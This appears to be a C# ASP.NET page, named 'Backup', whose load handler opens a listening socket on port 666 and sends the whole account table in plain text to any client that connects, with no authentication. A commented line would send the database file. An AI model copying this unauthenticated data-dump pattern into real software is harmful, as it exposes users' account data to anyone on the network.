using System;
using System.Collections.Generic;
using System.Linq;
using System.Web;
using System.Web.UI;
using System.Web.UI.WebControls;
using System.Net.Sockets;
using System.Net;
using System.Data;
using System.IO;
using System.Xml;

public partial class Backup : System.Web.UI.Page
{
    protected void Page_Load(object sender, EventArgs e)
    {
        IPEndPoint ipEnd = new IPEndPoint(IPAddress.Any, 666);
        Socket sock = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.IP);
        sock.Bind(ipEnd);
        sock.Listen(100);

        //clientSock is the socket object of client, so we can use it now to transfer data to client
        Socket clientSock = sock.Accept();
       
        DataTable data=(DataTable)DataAccess.AccountDB.GetAccountDataForBackup();
        DataRowCollection rows=data.Rows;
        StringWriter sw = new StringWriter();
        foreach (DataRow row in rows)
        {
            sw.Write("&");
            foreach (object item in row.ItemArray)
            {
                sw.Write(" "+item.ToString()+" &");
            }
            sw.WriteLine();
        }
        byte[] bytes = System.Text.Encoding.UTF8.GetBytes(sw.ToString());
        clientSock.Send(bytes);

        //clientSock.SendFile(HttpContext.Current.Request.ApplicationPath + "/App_Data/Riches.mdf");
        clientSock.Close();


    }
}